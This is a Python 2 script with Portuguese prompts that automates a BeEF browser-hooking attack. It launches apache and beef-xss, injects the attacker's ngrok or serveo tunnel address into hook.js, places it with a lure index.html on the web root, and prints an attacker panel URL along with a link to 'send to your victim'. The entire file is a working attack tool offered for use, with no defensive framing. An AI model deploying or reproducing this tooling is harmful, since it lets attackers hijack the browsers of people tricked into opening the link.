#!/usr/bin/python
# -*- coding: utf8 -*-

import os
from time import sleep

def color(string, color=None):
    attr = []
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        elif color.lower() == "yellow":
            attr.append('33')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
def arquivo(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            print 'erro'.format(**locals())
            
    
    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)


   


os.system("clear")

def redsocial():
    return"""

    YouTube: https://cutt.ly/ZyloUUG
    Servidor DISCORD: https://discord.gg/DZUgRwP


    """

def h1():
    return"""
    
    Você vai precisa de dois links encaminhados LocalHost:
    """
def h2():
    return'''
    http://exemplo.ngrok.io -> http://localhost:3000 / Atacante
    http://exemplo.ngrok.io -> http://localhost:80 / Vitima
    '''
def h3():
    return'''tunnels:
  first-app:
      addr: 80
      proto: http
  second-app:
      addr: 3000
      proto: http
      
      '''
def desenho():
    return'''

   d8888b. d888888b d88888b d88888b 
   88  `8D   `88'   88'     88'      
   88oooY'    88    88ooo   88ooooo    
   88~~~b.    88    88~~~   88~~~~~ 
   88   8D   .88.   88      88.     
   Y8888P' Y888888P YP      Y88888P '''

def beef():
    return'''                                      ▄
                                      ▌`W
                                      └▄ `ªw
                                        Φ,   "¥╥
   link vitima: localhost 80             `Φw "φ,`╙W,
                                           ╙▄ ╙██w`Φw
   link atacante: localhost 3000           ,╓█Γ  ███▄╙▌
                  ▓%,           ,╓▄Φ▀▀▀█╜```    ,██████
                  ║  W       ,▄▀`     ╔   ,╓▄▄█████████
                   " ┌ ▀    ╓█`        ║▓█████████████╜
                     ▄"▌ ╙W≤▓▌      ,▄█████████████▀"
                    ╙▄██w,,█      ▄██` █████████▌
                      ╙▀████⌐   ▄██▄╓╓▓██████████
                         ║█   ▄█████████████████L
                        ,█  ,███████████████████Γ
                      j▌,,▄▄▄, "███████████████▀
                      ,████████▄ █████████████`
                      █ ▐████▌ ██████████▀╨`
                      ▀w `""` ╓██████╜`
                      `╙╝▓███████▀`
                            `"""`
'''
def serveo_h1():
    return'''
    
    Serveo não utiliza nenhum token de autenticação é necessário. 
    O aplicativo pode ser usado diretamente através do prompt de comando

    '''
def ngork_h1():
    return'''
    
    Para o script funcionar e necessário um token onde se pode obter em
    https://ngrok.com

    '''
def finalizando():
    return'''
     _____ _             _ _                    _                   
    |  ___(_)_ __   __ _| (_)______ _ _ __   __| | ___              
    | |_  | | '_ \ / _` | | |_  / _` | '_ \ / _` |/ _ \             
    |  _| | | | | | (_| | | |/ / (_| | | | | (_| | (_) |  _   _   _ 
    |_|   |_|_| |_|\__,_|_|_/___\__,_|_| |_|\__,_|\___/  (_) (_) (_)

    '''

print color ("  Hora         Data","green")
os.system(' date +"  %R      %D" ')
print color(h1(),"yellow")
print color('''         http 80/ Vitima
         http 3000/ Atacante''',"red")
print color('''
    Basta digitar seus links no script:''',"green")
print color(h2(),"red")
print(color(redsocial(),"blue"))
enter = raw_input(color("enter para continuar","green"))
os.system("clear")
opcao = 0
while opcao != 4:
    print color ("  Hora         Data","green")
    os.system(' date +"  %R      %D" ')
    print color(desenho(),"blue")
    print color('''
    
    
    [1] Adicionar comandos no ngrok.yml
    [2] NGROK
    [3] Servidor serveo SSH
    [4] Sai do script
    
    ''',"green")
    sleep(1.0)
    opcao = int(input(color("script: ","yellow")))
    if opcao == 1:
        os.system("clear")
        print color ("  Hora         Data","green")
        os.system(' date +"  %R      %D" ')
        print color(ngork_h1(),"yellow")
        token = raw_input(color("token: ","red"))
        os.system("cp tempo/ngrok.yml ngrok.yml")
        arquivo("ngrok.yml","token_1",token)
        os.system("clear")
        print color ("  Hora         Data","green")
        os.system(' date +"  %R      %D" ')
        print("")
        print color("   Codigo do seu ngrok.yml","yellow")
        print("")
        sleep(0.50)
        print color("authtoken: "+token,"blue")
        print color(h3(),"blue")
        print("")
        print color("   ngrok.yml foi salvo na pasta do script","red")
        print("")
        print("")
        sleep(5.0)
        enter = raw_input(color("==> enter para volta ao menu","green"))
        os.system("clear")
    elif opcao == 2:
        os.system("clear")        
        print color ("  Hora         Data","green")
        os.system(' date +"  %R      %D" ')
        print("")
        print color("iniciando beef ... ","red")
        print("")
        os.system("service apache2 start")
        os.system("beef-xss")
        os.system("cp tempo/hook.js hook.js")
        os.system("cp tempo/index.html index.html")
        os.system('gnome-terminal -x bash -c "ngrok start --all"')
        os.system("clear")
        print color ("  Hora         Data","green")
        os.system(' date +"  %R      %D" ')
        print color (beef(),"blue")
        vitima = raw_input(color("link vitima: ","red"))
        atacante = raw_input(color("link atacante: ","red"))
        atacante_full = 'http://'+atacante+':80/hook.js'
        atacante_painel = 'http://'+atacante+'/ui/panel'
        vitima_full = 'http://'+vitima+'/index.html'
        arquivo("hook.js","goth_1",atacante_full)
        arquivo("hook.js","goth_2",atacante)
        arquivo("index.html","goth_3",vitima)
        os.system("mv index.html /var/www/html/index.html")
        os.system("mv hook.js /var/www/html/hook.js")
        print("")
        print color("painel do atacante","yellow")
        print color(atacante_painel,"red")
        print("")
        print color ("envie para sua vitima","yellow")
        print color(vitima_full,"red")
        print("")
        sleep(5.0)
        enter = raw_input(color("==> enter para volta ao menu","green"))
        os.system("clear")
    elif opcao == 3:
        os.system("clear")
        print color ("  Hora         Data","green")
        os.system(' date +"  %R      %D" ')
        print("")
        print color("iniciando beef ... ","red")
        print("")
        os.system("service apache2 start")
        os.system("beef-xss")
        os.system("cp tempo/hook.js hook.js")
        os.system("cp tempo/index.html index.html")
        os.system("clear")
        print color ("  Hora         Data","green")
        os.system(' date +"  %R      %D" ')
        print color(serveo_h1(),"yellow")
        print color("vitima: subdomínio","blue")
        print color("atacante: subdomínio","blue")
        print("")
        vitima = raw_input(color("vitima: ","red"))
        atacante = raw_input(color("atacante: ","red"))
        serveo_atacante = '-R '+atacante+':80:localhost:3000 serveo.net "'
        atacante_full = 'http://'+atacante+'.serveousercontent.com:80/hook.js'
        atacante_painel = 'http://'+atacante+'.serveousercontent.com/ui/panel'
        serveo_3000 = atacante+'.serveousercontent.com'
        arquivo("hook.js","goth_1",atacante_full)
        arquivo("hook.js","goth_2",serveo_3000)
        arquivo("index.html","goth_3",vitima+'.serveousercontent.com')
        os.system("mv index.html /var/www/html/index.html")
        os.system("mv hook.js /var/www/html/hook.js")
        os.system('gnome-terminal -x bash -c "'+'ssh -R '+vitima+':80:localhost:80 serveo.net '+serveo_atacante)
        os.system("clear")
        print color ("  Hora         Data","green")
        os.system(' date +"  %R      %D" ')
        print("")
        print color("painel do atacante","yellow")
        print color(atacante_painel,"red")
        print("")
        print color ("envie para sua vitima","yellow")
        print color('http://'+vitima+'.serveousercontent.com/index.html',"red")
        print("")
        sleep(5.0)
        enter = raw_input(color("==> enter para volta ao menu","green"))
        os.system("clear")        
    elif opcao == 4:
        os.system("clear")
    else:
        os.system("clear")

print color(finalizando(),"green")
print color(redsocial(),"red")
sleep(3.0)

